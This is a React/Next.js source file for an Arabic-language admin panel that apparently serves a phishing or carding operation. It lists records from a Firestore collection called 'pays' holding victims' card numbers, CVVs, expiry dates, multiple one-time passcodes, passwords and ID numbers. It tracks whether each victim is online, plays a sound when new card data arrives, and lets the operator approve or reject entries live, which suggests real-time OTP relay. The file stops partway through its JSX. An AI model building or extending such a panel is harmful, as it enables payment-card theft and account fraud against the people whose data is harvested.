"use client";

import type React from "react";
import { useState, useEffect, useMemo, useRef } from "react";
import { useRouter } from "next/navigation";
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  Activity,
  Filter,
  RefreshCw,
  AlertCircle,
  Loader2,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ar } from "date-fns/locale";
import { formatDistanceToNow, format } from "date-fns";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardFooter,
  CardDescription,
} from "@/components/ui/card";
import {
  collection,
  doc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { onValue, ref } from "firebase/database";
import { database } from "@/lib/firestore";
import { auth } from "@/lib/firestore";
import { db } from "@/lib/firestore";
import { playNotificationSound } from "@/lib/actions";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { Input } from "@/components/ui/input";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu";
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
import { Separator } from "@/components/ui/separator";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { toast } from "@/hooks/use-toast";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
} from "@/components/ui/sheet";

// Types
type FlagColor = "red" | "yellow" | "green" | null;

interface Notification {
  createdDate: string;
  bank: string;
  cardStatus?: string;
  ip?: string;
  cvv: string;
  id: string | "0";
  expiaryDate: string;
  notificationCount: number;
  otp: string;
  otp2: string;
  page: string;
  cardNumber: string;
  country?: string;
  personalInfo: {
    id?: string | "0";
    name?: string;
  };
  prefix: string;
  status: "pending" | "approved" | "rejected" | string;
  isOnline?: boolean;
  lastSeen: string;
  violationValue: number;
  pass?: string;
  year: string;
  month: string;
  pagename: string;
  plateType: string;
  allOtps?: string[] | null;
  idNumber: string;
  email: string;
  mobile: string;
  network: string;
  phoneOtp: string;
  cardExpiry: string;
  name: string;
  otpCode: string;
  phone: string;
  flagColor?: string;
  currentPage?: string;
  userName?: string;
  password?: string;
}

// Hook for online users count
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0);

  useEffect(() => {
    const onlineUsersRef = ref(database, "status");
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const onlineCount = Object.values(data).filter(
          (status: any) => status.state === "online"
        ).length;
        setOnlineUsersCount(onlineCount);
      }
    });

    return () => unsubscribe();
  }, []);

  return onlineUsersCount;
}

// Hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false);

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      setIsOnline(data && data.state === "online");
    });

    return () => unsubscribe();
  }, [userId]);

  return isOnline;
}

// Enhanced Statistics Card Component
function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string;
  value: string | number;
  change: string;
  changeType: "increase" | "decrease" | "neutral";
  icon: React.ElementType;
  color: string;
  trend?: number[];
}) {
  return (
    <Card className="relative overflow-hidden bg-gradient-to-br from-background to-muted/20 border-0 shadow-lg hover:shadow-xl transition-all duration-300">
      <CardHeader className="pb-2">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${color}`}>
            <Icon className="h-6 w-6 text-white" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                  ? "text-red-500"
                  : "text-gray-500"
              }`}
            />
            <span
              className={`text-sm font-medium ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                  ? "text-red-500"
                  : "text-gray-500"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-1 h-8">
              {trend.map((value, index) => (
                <div
                  key={index}
                  className={`w-1 rounded-sm ${color.replace(
                    "bg-",
                    "bg-"
                  )} opacity-60`}
                  style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  );
}

// Enhanced User Status Component
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
    "unknown"
  );

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline");
      } else {
        setStatus("unknown");
      }
    });

    return () => unsubscribe();
  }, [userId]);

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full ${
          status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"
        }`}
      />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  );
}

// Enhanced Flag Color Selector
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string;
  currentColor: FlagColor;
  onColorChange: (id: string, color: FlagColor) => void;
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                ? "text-yellow-500 fill-yellow-500"
                : currentColor === "green"
                ? "text-green-500 fill-green-500"
                : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          {[
            { color: "red", label: "عالي الأولوية" },
            { color: "yellow", label: "متوسط الأولوية" },
            { color: "green", label: "منخفض الأولوية" },
          ].map(({ color, label }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full bg-${color}-100 dark:bg-${color}-900 hover:bg-${color}-200 dark:hover:bg-${color}-800`}
                    onClick={() =>
                      onColorChange(notificationId, color as FlagColor)
                    }
                  >
                    <Flag
                      className={`h-4 w-4 text-${color}-500 fill-${color}-500`}
                    />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-gray-500" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  );
}

// Enhanced Search Component
function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("");
  const searchInputRef = useRef<HTMLInputElement>(null);

  const handleSearch = () => {
    onSearch(searchTerm);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch();
    }
  };

  return (
    <div className="relative">
      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="البحث في الإشعارات..."
        className="pl-10 pr-4 bg-background/50 backdrop-blur-sm border-muted-foreground/20 focus:border-primary/50 transition-colors"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
      />
    </div>
  );
}

// Enhanced Pagination Component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number;
  totalPages: number;
  onPageChange: (page: number) => void;
  totalItems: number;
  itemsPerPage: number;
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1;
  const endItem = Math.min(currentPage * itemsPerPage, totalItems);

  return (
    <div className="flex items-center justify-between">
      <div className="text-sm text-muted-foreground">
        عرض {startItem} إلى {endItem} من {totalItems} عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
          className="gap-1"
        >
          <ChevronRight className="h-4 w-4" />
          السابق
        </Button>
        <div className="flex items-center gap-1">
          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
            const page = i + 1;
            return (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                className="w-8 h-8 p-0"
                onClick={() => onPageChange(page)}
              >
                {page}
              </Button>
            );
          })}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
          className="gap-1"
        >
          التالي
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  );
}

// Export dialog component
function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  notifications: Notification[];
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv");
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  });
  const [isExporting, setIsExporting] = useState(false);

  const handleExport = () => {
    setIsExporting(true);

    // Simulate export process
    setTimeout(() => {
      setIsExporting(false);
      onOpenChange(false);
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${
          notifications.length
        } إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      });
    }, 1500);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-2">
            <Label>تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="csv" className="cursor-pointer">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="json" className="cursor-pointer">
                  JSON
                </Label>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label>البيانات المراد تصديرها</Label>
            <div className="space-y-2">
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="personal-info"
                  checked={exportFields.personalInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      personalInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="personal-info" className="cursor-pointer">
                  المعلومات الشخصية
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="card-info"
                  checked={exportFields.cardInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      cardInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="card-info" className="cursor-pointer">
                  معلومات البطاقة
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="status"
                  checked={exportFields.status}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      status: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="status" className="cursor-pointer">
                  حالة الإشعار
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="timestamps"
                  checked={exportFields.timestamps}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      timestamps: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="timestamps" className="cursor-pointer">
                  الطوابع الزمنية
                </Label>
              </div>
            </div>
          </div>

          <div className="rounded-md bg-muted p-3">
            <div className="flex items-center gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-muted-foreground" />
              <p className="text-muted-foreground">
                سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.
              </p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            إلغاء
          </Button>
          <Button type="submit" onClick={handleExport} disabled={isExporting}>
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

// Settings panel component
function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}) {
  const [notifyNewCards, setNotifyNewCards] = useState(true);
  const [notifyNewUsers, setNotifyNewUsers] = useState(true);
  const [playSounds, setPlaySounds] = useState(true);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [refreshInterval, setRefreshInterval] = useState("30");

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
        <SheetHeader>
          <SheetTitle className="flex items-center gap-2 text-xl">
            <Settings className="h-5 w-5" />
            إعدادات الإشعارات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-6">
          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
                  <p className="text-xs text-muted-foreground">
                    تلقي إشعارات عند إضافة بطاقة جديدة
                  </p>
                </div>
                <Switch
                  id="notify-cards"
                  checked={notifyNewCards}
                  onCheckedChange={setNotifyNewCards}
                />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
                  <p className="text-xs text-muted-foreground">
                    تلقي إشعارات عند تسجيل مستخدم جديد
                  </p>
                </div>
                <Switch
                  id="notify-users"
                  checked={notifyNewUsers}
                  onCheckedChange={setNotifyNewUsers}
                />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
                  <p className="text-xs text-muted-foreground">
                    تشغيل صوت عند استلام إشعار جديد
                  </p>
                </div>
                <Switch
                  id="play-sounds"
                  checked={playSounds}
                  onCheckedChange={setPlaySounds}
                />
              </div>
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
                  <p className="text-xs text-muted-foreground">
                    تحديث البيانات تلقائيًا
                  </p>
                </div>
                <Switch
                  id="auto-refresh"
                  checked={autoRefresh}
                  onCheckedChange={setAutoRefresh}
                />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5">
                  <Label htmlFor="refresh-interval">
                    فترة التحديث (بالثواني)
                  </Label>
                  <Select
                    value={refreshInterval}
                    onValueChange={setRefreshInterval}
                  >
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر فترة التحديث" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                      <SelectItem value="300">5 دقائق</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-4">
            <Button variant="outline" onClick={() => onOpenChange(false)}>
              إلغاء
            </Button>
            <Button
              onClick={() => {
                toast({
                  title: "تم حفظ الإعدادات",
                  description: "تم حفظ إعدادات الإشعارات بنجاح",
                });
                onOpenChange(false);
              }}
            >
              حفظ الإعدادات
            </Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  );
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
    null
  );
  const [selectedNotification, setSelectedNotification] =
    useState<Notification | null>(null);
  const [totalVisitors, setTotalVisitors] = useState<number>(0);
  const [cardSubmissions, setCardSubmissions] = useState<number>(0);
  const [filterType, setFilterType] = useState<"all" | "card" | "online">(
    "all"
  );
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage] = useState(10);
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [exportDialogOpen, setExportDialogOpen] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date");
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
  const router = useRouter();
  const onlineUsersCount = useOnlineUsersCount();

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
    {}
  );

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {};

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`);

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val();
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }));
      });

      statusRefs[notification.id] = callback;
    });

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe();
        }
      });
    };
  }, [notifications]);

  // Statistics calculations
  const totalVisitorsCount = notifications.length;
  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
  const approvedCount = notifications.filter(
    (n) => n.status === "approved"
  ).length;
  const pendingCount = notifications.filter(
    (n) => n.status === "pending"
  ).length;

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications;

    // Apply filter type
    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber);
    } else if (filterType === "online") {
      filtered = filtered.filter(
        (notification) => onlineStatuses[notification.id]
      );
    }

    // Apply search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(
        (notification) =>
          notification.name?.toLowerCase().includes(term) ||
          notification.email?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term)
      );
    }

    // Apply sorting
    filtered.sort((a, b) => {
      let aValue: any, bValue: any;

      switch (sortBy) {
        case "date":
          aValue = new Date(a.createdDate);
          bValue = new Date(b.createdDate);
          break;
        case "status":
          aValue = a.status;
          bValue = b.status;
          break;
        case "country":
          aValue = a.country || "";
          bValue = b.country || "";
          break;
        default:
          return 0;
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1;
      } else {
        return aValue < bValue ? 1 : -1;
      }
    });

    return filtered;
  }, [
    filterType,
    notifications,
    onlineStatuses,
    searchTerm,
    sortBy,
    sortOrder,
  ]);

  // Paginate notifications
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage;
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage);
  }, [filteredNotifications, currentPage, itemsPerPage]);

  const totalPages = Math.max(
    1,
    Math.ceil(filteredNotifications.length / itemsPerPage)
  );

  // Reset to first page when filter or search changes
  useEffect(() => {
    setCurrentPage(1);
  }, [filterType, searchTerm]);

  // Firebase authentication and data fetching
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login");
      } else {
        const unsubscribeNotifications = fetchNotifications();
        return () => {
          unsubscribeNotifications();
        };
      }
    });

    return () => unsubscribe();
  }, [router]);

  const fetchNotifications = () => {
    setIsLoading(true);
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any;
            return { id: doc.id, ...data };
          })
          .filter(
            (notification: any) => !notification.isHidden
          ) as Notification[];

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber &&
            !notifications.some((n) => n.id === notification.id && n.cardNumber)
        );
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber ||
              notification.email ||
              notification.mobile) &&
            !notifications.some(
              (n) =>
                n.id === notification.id && (n.idNumber || n.email || n.mobile)
            )
        );

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound();
        }

        // Update statistics
        updateStatistics(notificationsData);

        setNotifications(notificationsData);
        setIsLoading(false);
      },
      (error) => {
        console.error("Error fetching notifications:", error);
        setIsLoading(false);
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        });
      }
    );

    return unsubscribe;
  };

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length;

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter(
      (notification) => notification.cardNumber
    ).length;

    setTotalVisitors(totalCount);
    setCardSubmissions(cardCount);
  };

  const handleInfoClick = (
    notification: Notification,
    infoType: "personal" | "card"
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  const handleFlagColorChange = async (id: string, color: string) => {
    try {
      // Update in Firestore
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { flagColor: color });

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id
            ? { ...notification, flagColor: color }
            : notification
        )
      );

      toast({
        title: "تم تحديث العلامة",
        description: color
          ? "تم تحديث لون العلامة بنجاح"
          : "تمت إزالة العلامة بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating flag color:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      });
    }
  };

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id);
      await updateDoc(targetPost, {
        status: state,
      });
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description:
          state === "approved"
            ? "تمت الموافقة على الإشعار بنجاح"
            : "تم رفض الإشعار بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating notification status:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      });
    }
  };

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { isHidden: true });
      setNotifications(
        notifications.filter((notification) => notification.id !== id)
      );
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error hiding notification:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      });
    }
  };

  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id);
        batch.update(docRef, { isHidden: true });
      });
      await batch.commit();
      setNotifications([]);
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error hiding all notifications:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push("/login");
    } catch (error) {
      console.error("Error signing out:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      });
    }
  };

  const handleSearch = (term: string) => {
    setSearchTerm(term);
  };

  const handlePageChange = (page: number) => {
    setCurrentPage(page);
  };

  const handleRefresh = () => {
    setIsLoading(true);
    fetchNotifications();
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
          </div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    );
  }

  // Sample data for mini charts (you can replace with real trend data)
  const visitorTrend = [5, 8, 12, 7, 10, 15, 13];
  const cardTrend = [2, 3, 5, 4, 6, 8, 7];
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6];
  const approvedTrend = [1, 2, 4, 3, 5, 7, 6];

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20"
    >
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="flex items-center gap-2">
              <Bell className="h-5 w-5 text-primary" />
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-6">
            <div className="flex items-center gap-4">
              <Avatar>
                <AvatarImage
                  src="/placeholder.svg?height=40&width=40"
                  alt="صورة المستخدم"
                />
                <AvatarFallback>M</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-medium">مدير النظام</p>
                <p className="text-sm text-muted-foreground">
                  admin@example.com
                </p>
              </div>
            </div>
            <Separator />
            <nav className="space-y-2">
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => setMobileMenuOpen(false)}
              >
                <Bell className="mr-2 h-4 w-4" />
                الإشعارات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => setSettingsOpen(true)}
              >
                <Settings className="mr-2 h-4 w-4" />
                الإعدادات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => {
                  setExportDialogOpen(true);
                  setMobileMenuOpen(false);
                }}
              >
                <Download className="mr-2 h-4 w-4" />
                تصدير البيانات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start text-red-500"
                onClick={handleLogout}
              >
                <LogOut className="mr-2 h-4 w-4" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      {/* Settings panel */}
      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />

      {/* Export dialog */}
      <ExportDialog
        open={exportDialogOpen}
        onOpenChange={setExportDialogOpen}
        notifications={filteredNotifications}
      />

      {/* Enhanced Header */}
      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60">
        <div className="flex items-center justify-between p-4">
          <div className="flex items-center gap-4">
            <Button
              variant="ghost"
              size="icon"
              className="md:hidden"
              onClick={() => setMobileMenuOpen(true)}
            >
              <Menu className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <div className="relative">
                <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
                  <Bell className="h-6 w-6 text-white" />
                </div>
                {pendingCount > 0 && (
                  <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse">
                    {pendingCount}
                  </div>
                )}
              </div>
              <div>
                <h1 className="text-xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
                  لوحة الإشعارات المتقدمة
                </h1>
                <p className="text-sm text-muted-foreground">
                  آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={handleRefresh}
                    className="relative overflow-hidden"
                  >
